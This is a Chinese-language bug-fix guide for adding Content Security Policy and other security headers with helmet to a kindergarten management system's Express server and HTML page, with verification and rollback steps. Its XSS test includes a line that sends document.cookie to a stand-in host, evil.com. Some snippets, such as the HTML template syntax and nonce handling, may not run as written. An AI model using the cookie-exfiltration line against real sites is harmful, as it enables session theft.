# Bug #22 修复指南 - 缺少内容安全策略（CSP）

## 问题描述
缺少内容安全策略（Content Security Policy）头，容易受到XSS攻击、数据注入等安全威胁。

## 严重级别
**高**

## 受影响的文件
- `server/src/app.ts` (helmet配置)
- `client/index.html` (meta标签)

## 问题分析

1. **XSS攻击**: 恶意脚本可以注入和执行
2. **数据泄露**: 可以加载外部恶意资源
3. **点击劫持**: 可以在iframe中嵌入页面
4. **混合内容**: HTTPS页面加载HTTP资源

## 修复方案（配置CSP，开发环境允许内联脚本）

### 步骤 1: 安装依赖

```bash
cd server && npm install helmet
```

### 步骤 2: 创建CSP配置

在 `server/src/config/csp.config.ts` 创建配置文件：

```typescript
import helmet from 'helmet';

/**
 * 开发环境检测
 */
const isDevelopment = process.env.NODE_ENV === 'development';
const isProduction = process.env.NODE_ENV === 'production';

/**
 * CSP源配置
 */
export const CSP_SOURCES = {
  // 默认源
  defaultSrc: ["'self'"],

  // 脚本源
  scriptSrc: isDevelopment
    ? ["'self'", "'unsafe-inline'", "'unsafe-eval'"] // 开发环境需要
    : ["'self'"],

  // 样式源
  styleSrc: ["'self'", "'unsafe-inline'"], // CSS需要inline

  // 图片源
  imgSrc: ["'self'", "data:", "https:", "blob:"],

  // 字体源
  fontSrc: ["'self'", "data:"],

  // 连接源（API、WebSocket）
  connectSrc: [
    "'self'",
    "http://localhost:*",
    "https://localhost:*",
    ...(isProduction ? [] : ["ws://localhost:*", "wss://localhost:*"])
  ],

  // 媒体源
  mediaSrc: ["'self'", "blob:"],

  // 对象源
  objectSrc: ["'none'"], // 不允许插件

  // 嵌入源
  childSrc: ["'self'"],

  // 框架源
  frameSrc: ["'none'"], // 不允许iframe

  // Worker源
  workerSrc: ["'self'", "blob:"],

  // Manifest源
  manifestSrc: ["'self'"],

  // 基础URI
  baseUri: ["'self'"],

  // 表单action
  formAction: ["'self'"],

  // Frame-ancestors（防止点击劫持）
  frameAncestors: ["'none'"],

  // Upgrade-insecure-requests（自动升级HTTP到HTTPS）
  upgradeInsecureRequests: isProduction
};

/**
 * CSP配置
 */
export const cspConfig = {
  directives: {
    ...CSP_SOURCES,

    // 添加报告URI（用于监控CSP违规）
    ...(isProduction && {
      reportUri: '/api/security/csp-report'
    }),

    // 添加报告到
    ...(isProduction && {
      reportTo: 'csp-endpoint'
    })
  },

  // 报告模式（不阻止，只报告）
  reportOnly: process.env.CSP_REPORT_ONLY === 'true'
};

/**
 * Helmet安全头配置
 */
export const helmetConfig = {
  // Content Security Policy
  contentSecurityPolicy: cspConfig,

  // HTTP Strict Transport Security (仅HTTPS)
  hsts: isProduction
    ? {
        maxAge: 31536000, // 1年
        includeSubDomains: true,
        preload: true
      }
    : false,

  // X-Frame-Options (防止点击劫持)
  frameguard: {
    action: 'deny' // 不允许在任何iframe中嵌入
  },

  // X-Content-Type-Options (防止MIME嗅探)
  noSniff: true,

  // X-XSS-Protection (已过时，但保留用于兼容)
  xssFilter: true,

  // Referrer-Policy
  referrerPolicy: {
    policy: ['strict-origin-when-cross-origin']
  },

  // Permissions-Policy (原Feature-Policy)
  permissionsPolicy: {
    features: {
      geolocation: ["'none'"],
      microphone: ["'none'"],
      camera: ["'none'"],
      payment: ["'none'"],
      usb: ["'none'"],
      magnetometer: ["'none'"],
      gyroscope: ["'none'"],
      accelerometer: ["'none'"]
    }
  },

  // 跨域资源策略
  crossOriginResourcePolicy: {
    policy: 'cross-origin'
  },

  // 跨域嵌入策略
  crossOriginEmbedderPolicy: false,

  // 跨域打开策略
  crossOriginOpenerPolicy: {
    policy: 'same-origin-allow-popups'
  }
};

/**
 * 开发环境宽松配置
 */
export const developmentHelmetConfig = {
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", 'http://localhost:*'],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:", "blob:", 'http://localhost:*'],
      connectSrc: ["'self'", "http://localhost:*", "https://localhost:*", "ws://localhost:*", "wss://localhost:*"],
      fontSrc: ["'self'", "data:"],
      mediaSrc: ["'self'", "blob:"],
      objectSrc: ["'none'"],
      frameSrc: ["'self'"],
      workerSrc: ["'self'", "blob:", 'http://localhost:*']
    }
  },

  // 其他安全头保持默认
  noSniff: true,
  frameguard: { action: 'deny' }
};

/**
 * 获取当前环境配置
 */
export function getHelmetConfig() {
  return isDevelopment ? developmentHelmetConfig : helmetConfig;
}
```

### 步骤 3: 在app.ts中应用

**修复前：**
```typescript
// ❌ 没有安全头
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
```

**修复后：**
```typescript
import helmet from 'helmet';
import { getHelmetConfig } from './config/csp.config';

// ================================
# 安全头配置
# ================================

// 应用helmet中间件
app.use(helmet(getHelmetConfig()));
```

### 步骤 4: 添加CSP报告端点

```typescript
/**
 * CSP违规报告端点
 */
app.post('/api/security/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body;

  // 记录CSP违规
  console.warn('🚨 CSP违规报告:', {
    'document-uri': report['csp-report']['document-uri'],
    'violated-directive': report['csp-report']['violated-directive'],
    'blocked-uri': report['csp-report']['blocked-uri'],
    timestamp: new Date().toISOString()
  });

  // 保存到数据库或日志系统
  // await saveCspViolation(report);

  res.status(204).end();
});
```

### 步骤 5: 前端CSP Meta标签

在 `client/index.html` 中：

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <link rel="icon" type="image/svg+xml" href="/vite.svg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- 开发环境：宽松的CSP -->
  <% if (import.meta.env.DEV) { %>
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval' http://localhost:*;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https: blob: http://localhost:*;
    connect-src 'self' http://localhost:* https://localhost:* ws://localhost:* wss://localhost:*;
    font-src 'self' data:;
    media-src 'self' blob:;
    object-src 'none';
    frame-src 'self';
    worker-src 'self' blob: http://localhost:*;
  ">
  <% } else { %>
  <!-- 生产环境：严格的CSP -->
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https: blob:;
    connect-src 'self' https:;
    font-src 'self' data:;
    media-src 'self' blob:;
    object-src 'none';
    frame-src 'none';
    worker-src 'self' blob:;
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
    upgrade-insecure-requests
  ">
  <% } %>

  <title>幼儿园管理系统</title>
</head>
<body>
  <div id="app"></div>
  <script type="module" src="/src/main.ts"></script>
</body>
</html>
```

### 步骤 6: 环境变量配置

在 `server/.env` 中添加：

```bash
# ================================
# 内容安全策略配置
# ================================

# CSP报告模式（只报告，不阻止）
# - true: 只记录违规，不阻止（用于测试）
# - false: 阻止违规请求（生产环境）
CSP_REPORT_ONLY=false

# 是否启用HSTS（仅HTTPS）
ENABLE_HSTS=true
```

在 `client/.env` 中添加：

```bash
# 前端CSP配置
VITE_CSP_STRICT=false
```

### 步骤 7: 前端动态资源处理

对于需要动态加载的资源，使用nonce：

```typescript
// 在server中间件中生成nonce
import { v4 as uuidv4 } from 'uuid';

app.use((req, res, next) => {
  res.locals.nonce = uuidv4();
  next();
});

// 在CSP配置中使用nonce
export const cspConfig = {
  directives: {
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`]
  }
};

// 在模板中使用
<script nonce="<%= nonce %>" src="/script.js"></script>
```

## 本地调试保证

### 开发环境宽松配置

```typescript
const isDevelopment = process.env.NODE_ENV === 'development';

export const developmentHelmetConfig = {
  contentSecurityPolicy: {
    directives: {
      // 允许Vite的内联脚本
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
      // 允许开发服务器的连接
      connectSrc: ["'self'", "http://localhost:*", "ws://localhost:*"]
    }
  }
};
```

- ✅ 允许内联脚本（Vite HMR需要）
- ✅ 允许eval（某些开发工具需要）
- ✅ 允许连接到localhost
- ✅ 不影响热模块替换

### 环境检测

```typescript
if (isDevelopment) {
  // 使用宽松配置
  app.use(helmet(developmentHelmetConfig));
} else {
  // 使用严格配置
  app.use(helmet(helmetConfig));
}
```

## 验证步骤

### 1. 测试CSP响应头

```bash
# 检查响应头
curl -I http://localhost:3000/api/users

# 应该看到：
# Content-Security-Policy: default-src 'self'; script-src 'self' ...
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# X-XSS-Protection: 1; mode=block
```

### 2. 测试XSS防护

```javascript
// 在浏览器控制台测试
// 尝试注入脚本
const img = new Image();
img.src = 'http://evil.com/steal?data=' + document.cookie;
document.body.appendChild(img);

// 如果CSP正确配置，请求应该被阻止
```

### 3. 测试iframe防护

```html
<!-- 尝试在iframe中嵌入 -->
<iframe src="http://localhost:3000"></iframe>
<!-- 应该被阻止 -->
```

### 4. 测试开发环境

```bash
# 启动开发服务器
npm run dev

# 访问 http://localhost:5173
# 检查控制台，确认没有CSP错误
```

### 5. 测试CSP违规报告

```bash
# 测试CSP违规（应该被记录）
curl -X POST http://localhost:3000/api/security/csp-report \
  -H "Content-Type: application/csp-report" \
  -d '{"csp-report":{"document-uri":"http://example.com","violated-directive":"script-src","blocked-uri":"http://evil.com"}}'
```

## 回滚方案

如果CSP导致问题：

1. **使用报告模式**：
   ```bash
   export CSP_REPORT_ONLY=true
   ```

2. **添加更多允许的源**：
   ```typescript
   scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.example.com"]
   ```

3. **完全禁用CSP**：
   ```typescript
   app.use(helmet({
     contentSecurityPolicy: false
   }));
   ```

4. **仅保留关键安全头**：
   ```typescript
   app.use(helmet({
     contentSecurityPolicy: false, // 禁用CSP
     noSniff: true,
     frameguard: true
   }));
   ```

## 修复完成检查清单

- [ ] helmet已安装
- [ ] CSP配置已创建
- [ ] helmet中间件已应用
- [ ] CSP报告端点已创建
- [ ] 前端meta标签已添加
- [ ] 环境变量已配置
- [ ] 开发环境宽松配置已测试
- [ ] 生产环境严格配置已测试
- [ ] XSS防护已验证
- [ ] 本地调试不受影响

## 风险评估

- **风险级别**: 低
- **影响范围**: 所有HTTP响应
- **回滚难度**: 低（调整配置或禁用）
- **本地调试影响**: 无（开发环境使用宽松配置）

---

**修复时间估计**: 3-4 小时
**测试时间估计**: 2-3 小时
**总时间估计**: 5-7 小时
